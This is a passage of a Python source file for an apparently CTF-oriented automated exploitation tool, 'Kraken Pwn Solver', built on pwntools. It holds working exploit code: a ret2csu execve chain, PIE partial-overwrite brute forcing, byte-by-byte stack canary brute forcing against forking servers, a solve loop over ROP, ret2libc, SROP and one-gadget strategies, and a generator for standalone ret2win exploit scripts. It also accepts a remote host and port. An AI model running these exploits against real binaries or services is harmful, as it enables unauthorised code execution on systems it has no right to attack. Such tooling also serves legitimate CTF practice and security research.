            execve_got = self.elf.got.get("execve")
            if execve_got and sh_addr:
                try:
                    rop2 = ROP(self.elf)
                    rop2.ret2csu(edi=sh_addr, rsi=0, rdx=0, call=execve_got)
                    payload = b"A" * self.offset + rop2.chain()

                    flag = self._run_payload_and_extract(payload, shell_mode=True)
                    if flag:
                        print("[+] ret2csu (execve) succeeded!")
                        return flag
                except Exception as exc:
                    print(f"[-] ret2csu execve call failed: {exc}")

        except Exception as exc:
            print(f"[-] ret2csu failed: {exc}")

        return None

    # -----------------------------------------------------------------------
    # Strategy 11: PIE partial overwrite (NEW)
    # -----------------------------------------------------------------------
    def try_pie_partial(self) -> str | None:
        """Exploit PIE binaries using partial return address overwrite.

        Bottom 12 bits of addresses aren't randomized with PIE.
        Overwrite last 1-2 bytes of return address to redirect to win function.
        1 byte = deterministic, 2 bytes = 1/16 brute force.
        """
        if not self.protections.get("pie"):
            print("[-] PIE partial: PIE not enabled (use normal strategies)")
            return None

        if not self.win_functions:
            print("[-] PIE partial: No win functions found")
            return None

        if self.offset is None:
            print("[-] PIE partial: No overflow offset found")
            return None

        if not self.elf:
            return None

        print("[*] Trying PIE partial overwrite...")

        # Get the win function's offset within the binary
        for win_name, win_addr in self.win_functions.items():
            # Under PIE, the address in ELF is the offset
            win_offset_low = win_addr & 0xFFF   # bottom 12 bits (deterministic)
            win_offset_2b = win_addr & 0xFFFF    # bottom 16 bits (4-bit brute force)

            print(f"[*] Win function {win_name}: offset low12={hex(win_offset_low)}, low16={hex(win_offset_2b)}")

            # Strategy A: 1-byte overwrite (if bottom byte differs from return addr)
            # The return address on stack has the same base, just different offset
            # We overwrite just the lowest byte(s)

            # Try 1-byte overwrite (deterministic)
            low_byte = win_offset_low & 0xFF
            payload_1b = b"A" * self.offset + bytes([low_byte])

            flag = self._run_payload_and_extract(payload_1b)
            if flag:
                print(f"[+] PIE partial 1-byte overwrite succeeded ({win_name})!")
                return flag

            # Strategy B: 2-byte overwrite (1/16 brute force for ASLR page)
            # Bottom 12 bits are fixed, bits 12-15 are randomized
            # We need to guess 4 bits = 16 possibilities
            print(f"[*] Trying 2-byte brute force (16 attempts)...")
            for nibble in range(16):
                low_2bytes = (nibble << 12) | win_offset_low
                payload_2b = b"A" * self.offset + struct.pack("<H", low_2bytes)

                flag = self._run_payload_and_extract(payload_2b)
                if flag:
                    print(f"[+] PIE partial 2-byte overwrite succeeded (nibble={nibble})!")
                    return flag

        print("[-] PIE partial: No strategy yielded a flag")
        return None

    # -----------------------------------------------------------------------
    # Strategy 12: Canary brute-force for forking servers (NEW)
    # -----------------------------------------------------------------------
    def try_canary_bruteforce(self) -> str | None:
        """Brute-force stack canary byte-by-byte for forking servers.

        When a server uses fork(), the child inherits the same canary.
        We can brute-force it one byte at a time:
        - First byte is always \\x00
        - Then 7 more bytes, each with 256 possibilities
        - Max attempts: 7 * 256 = 1792
        """
        if not self.protections.get("canary"):
            print("[-] canary bruteforce: No canary detected")
            return None

        if not self.has_fork:
            print("[-] canary bruteforce: No fork() detected - canary changes each run")
            return None

        if not self.win_functions and not self.elf:
            print("[-] canary bruteforce: No win functions and no binary to analyze")
            return None

        print("[*] Trying canary brute-force (forking server)...")

        # Determine the offset to canary
        buf_size = None
        if self.source_code:
            buf_matches = re.findall(r"char\s+\w+\s*\[\s*(\d+)\s*\]", self.source_code)
            if buf_matches:
                buf_size = max(int(m) for m in buf_matches)

        if buf_size is None:
            # Try common sizes
            buf_sizes_to_try = [16, 24, 32, 40, 48, 56, 64, 72, 80, 96, 104, 128]
        else:
            buf_sizes_to_try = [buf_size]

        word_size = 8 if self.bits == 64 else 4
        pack = p64 if self.bits == 64 else p32

        for buf_sz in buf_sizes_to_try:
            print(f"[*] Trying buffer size {buf_sz}...")

            # Brute-force canary byte by byte
            # First byte of canary is \x00 (null terminator)
            canary_bytes = b"\x00"

            for byte_pos in range(1, word_size):
                found = False
                for guess in range(256):
                    test_canary = canary_bytes + bytes([guess])
                    payload = b"A" * buf_sz + test_canary

                    try:
                        proc = self._get_target()
                        try:
                            proc.recv(timeout=1)
                        except Exception:
                            pass
                        proc.send(payload)
                        time.sleep(0.3)

                        try:
                            response = proc.recv(timeout=2)
                        except Exception:
                            response = b""
                        proc.close()

                        # If the process didn't crash (or returned normally),
                        # this byte is correct
                        # We detect crash by checking if we get a response or
                        # if the connection stays alive
                        if b"stack" not in response.lower() and len(response) > 0:
                            canary_bytes = test_canary
                            found = True
                            print(f"    [+] Byte {byte_pos}: {hex(guess)} (canary so far: {canary_bytes.hex()})")
                            break
                    except Exception:
                        continue

                if not found:
                    # Try without checking response (just check if process survives)
                    for guess in range(256):
                        test_canary = canary_bytes + bytes([guess])
                        # Pad to full canary + rbp to not corrupt further
                        payload = b"A" * buf_sz + test_canary + b"\x00" * (word_size - len(test_canary))

                        try:
                            proc = self._get_target()
                            try:
                                proc.recv(timeout=1)
                            except Exception:
                                pass
                            proc.send(payload + b"\n")
                            time.sleep(0.2)
                            try:
                                # If we can still communicate, canary byte is correct
                                proc.sendline(b"test")
                                resp = proc.recv(timeout=1)
                                if resp:
                                    canary_bytes = test_canary
                                    found = True
                                    print(f"    [+] Byte {byte_pos}: {hex(guess)}")
                                    break
                            except Exception:
                                pass
                            finally:
                                try:
                                    proc.close()
                                except Exception:
                                    pass
                        except Exception:
                            continue

                if not found:
                    print(f"    [-] Failed to brute-force byte {byte_pos}")
                    break

            if len(canary_bytes) == word_size:
                if self.bits == 64:
                    canary_val = u64(canary_bytes)
                else:
                    canary_val = u32(canary_bytes)
                print(f"[+] Canary brute-forced: {hex(canary_val)}")
                self.leaked_canary = canary_val

                # Now exploit with known canary
                for target_name, target_addr in self.win_functions.items():
                    # Layout: [buffer][canary][saved_rbp][return_addr]
                    payload = b"A" * buf_sz
                    payload += pack(canary_val)
                    payload += pack(0)  # saved rbp
                    ret_gadget = self._find_ret_gadget()
                    if self.bits == 64 and ret_gadget:
                        payload += pack(ret_gadget)
                    payload += pack(target_addr)

                    flag = self._run_payload_and_extract(payload)
                    if flag:
                        print(f"[+] Canary brute-force + ret2win succeeded!")
                        return flag

        print("[-] canary bruteforce: Failed")
        return None

    # -----------------------------------------------------------------------
    # Direct execution strategies (no exploit needed)
    # -----------------------------------------------------------------------
    def try_direct_run(self) -> str | None:
        """Just run the binary with various inputs and check for flags."""
        print("[*] Trying direct execution with common inputs...")

        common_inputs = [
            b"",
            b"\n",
            b"flag",
            b"password",
            b"admin",
            b"yes",
            b"1",
            b"A" * 100,
        ]

        for inp in common_inputs:
            try:
                proc = process(self.binary, level="error")
                proc.sendline(inp)
                try:
                    output = proc.recvall(timeout=5)
                except Exception:
                    try:
                        output = proc.recv(timeout=3)
                    except Exception:
                        output = b""
                proc.close()
            except Exception:
                continue

            text = output.decode("utf-8", errors="replace")
            flags = _scan_flags(text, self.flag_format)
            if flags:
                best = _best_flag(flags)
                if best:
                    print(f"[+] Flag found in direct execution output!")
                    return best

        return None

    # -----------------------------------------------------------------------
    # Script generation (for manual use)
    # -----------------------------------------------------------------------
    def generate_exploit_script(self, strategy: str, **kwargs) -> str | None:
        """Generate a standalone pwntools exploit script."""
        if strategy == "ret2win" and self.offset is not None and self.win_functions:
            target_name = list(self.win_functions.keys())[0]
            target_addr = list(self.win_functions.values())[0]
            ret_gadget = self._find_ret_gadget()

            script = f'''#!/usr/bin/env python3
"""Auto-generated ret2win exploit by Kraken Pwn Solver."""
from pwn import *

binary = "{self.binary}"
context.binary = binary
context.log_level = "info"

elf = ELF(binary)
p = process(binary)

offset = {self.offset}
target = {hex(target_addr)}  # {target_name}
'''
            if self.bits == 64 and ret_gadget:
                script += f'''ret = {hex(ret_gadget)}

payload = b"A" * offset
payload += p64(ret)       # stack alignment
payload += p64(target)    # {target_name}
'''
            else:
                pack_fn = "p64" if self.bits == 64 else "p32"
                script += f'''
payload = b"A" * offset
payload += {pack_fn}(target)  # {target_name}
'''
            script += '''
p.sendline(payload)
p.interactive()
'''
            return script

        return None

    # -----------------------------------------------------------------------
    # Main solve loop
    # -----------------------------------------------------------------------
    def solve(self) -> str | None:
        """Main solve loop -- try strategies in order of simplicity.
        Returns extracted flag or None."""

        if not self.analyze():
            return None

        # Build strategy list dynamically based on binary properties
        strategies = [
            ("Direct execution", self.try_direct_run),
            ("ret2win", self.try_ret2win),
            ("ret2shellcode", self.try_ret2shellcode),
            ("Format string", self.try_format_string),
        ]

        # PIE-aware ordering
        if self.protections.get("pie"):
            # PIE binaries: try partial overwrite first, then others
            strategies.append(("PIE partial overwrite", self.try_pie_partial))
        else:
            # Non-PIE: full range of strategies
            strategies.extend([
                ("ret2libc", self.try_ret2libc),
                ("ROP chain", self.try_rop_chain),
                ("ret2dlresolve", self.try_ret2dlresolve),
                ("ret2csu", self.try_ret2csu),
                ("SROP", self.try_srop),
            ])

        # Strategies that work regardless
        strategies.extend([
            ("Stack pivot", self.try_stack_pivot),
            ("One-gadget", self.try_one_gadget),
        ])

        # Canary-specific strategies
        if self.protections.get("canary") and self.has_fork:
            strategies.append(("Canary brute-force", self.try_canary_bruteforce))

        # PIE binaries: also try non-PIE strategies as fallback
        # (PIE + partial RELRO might still allow ret2dlresolve etc.)
        if self.protections.get("pie"):
            strategies.extend([
                ("ret2libc (PIE fallback)", self.try_ret2libc),
                ("ret2dlresolve (PIE fallback)", self.try_ret2dlresolve),
            ])

        for name, strategy_fn in strategies:
            print(f"\n{'=' * 60}")
            print(f"[*] Strategy: {name}")
            print(f"{'=' * 60}")
            try:
                flag = strategy_fn()
                if flag:
                    return flag
            except Exception as exc:
                print(f"[-] {name} raised exception: {exc}")
                continue

        # Summary of findings
        print(f"\n{'=' * 60}")
        print("[*] Exploitation Summary")
        print(f"{'=' * 60}")
        print(f"    Architecture:    {self.arch} ({self.bits}-bit)")
        print(f"    NX:              {'Enabled' if self.protections.get('nx') else 'DISABLED'}")
        print(f"    PIE:             {'Enabled' if self.protections.get('pie') else 'Disabled'}")
        print(f"    Canary:          {'Enabled' if self.protections.get('canary') else 'Disabled'}")
        print(f"    RELRO:           {self.protections.get('relro', 'Unknown')}")
        print(f"    Win functions:   {len(self.win_functions)} found")
        for name, addr in self.win_functions.items():
            print(f"        {name} @ {hex(addr)}")
        print(f"    Overflow offset: {self.offset if self.offset else 'Not found'}")
        print(f"    Format string:   {'Detected' if self.has_fmtstr_vuln else 'Not detected'}")
        print(f"    Fork detected:   {'Yes' if self.has_fork else 'No'}")
        print(f"    Canary leaked:   {hex(self.leaked_canary) if self.leaked_canary else 'No'}")

        # Generate exploit script for manual use
        if self.win_functions and self.offset is not None:
            script = self.generate_exploit_script("ret2win")
            if script:
                script_path = tempfile.mktemp(suffix="_exploit.py")
                with open(script_path, "w") as f:
                    f.write(script)
                print(f"\n[*] Generated exploit script: {script_path}")

        return None


# ---------------------------------------------------------------------------
# CLI entry point
# ---------------------------------------------------------------------------
def main():
    parser = argparse.ArgumentParser(
        description="Kraken Pwn Solver - automated binary exploitation",
    )
    parser.add_argument("binary", help="Path to the target ELF binary")
    parser.add_argument(
        "--source", default=None,
        help="Path to source code (optional, aids analysis)",
    )
    parser.add_argument(
        "--prefix", default="flag",
        help="Flag prefix (default: flag)",
    )
    parser.add_argument(
        "--flag-format", default="",
        help="Regex for expected flag format",
    )
    parser.add_argument(
        "--remote-host", default=None,
        help="Remote host for network exploitation",
    )
    parser.add_argument(
        "--remote-port", default=None, type=int,
        help="Remote port for network exploitation",
    )
    parser.add_argument(
        "--libc", default=None,
        help="Path to libc for ret2libc exploitation",
    )
    parser.add_argument(
        "--timeout", default=30, type=int,
        help="Exploit timeout in seconds (default: 30)",
    )

    args = parser.parse_args()

    if not PWNTOOLS_AVAILABLE:
        print("[-] FATAL: pwntools not installed. Install with: pip install pwntools",
              file=sys.stderr)
        sys.exit(1)

    binary_path = os.path.abspath(args.binary)
    if not os.path.isfile(binary_path):
        print(f"[-] Binary not found: {binary_path}")
        sys.exit(1)

    # Build flag format from prefix if not explicitly provided
    flag_format = args.flag_format
    if not flag_format and args.prefix != "flag":
        flag_format = rf"{re.escape(args.prefix)}\{{[A-Za-z0-9_\-\.]+\}}"

    solver = PwnSolver(
        binary_path=binary_path,
        source_path=args.source,
        remote_host=args.remote_host,
        remote_port=args.remote_port,
        prefix=args.prefix,
        flag_format=flag_format,
        libc_path=args.libc,
        timeout=args.timeout,
    )

    flag = solver.solve()
    if flag:
        print(f"\nEXTRACTED FLAG: {flag}")
        sys.exit(0)
    else:
        print("\n[-] No flag extracted")
        sys.exit(1)


if __name__ == "__main__":
    main()
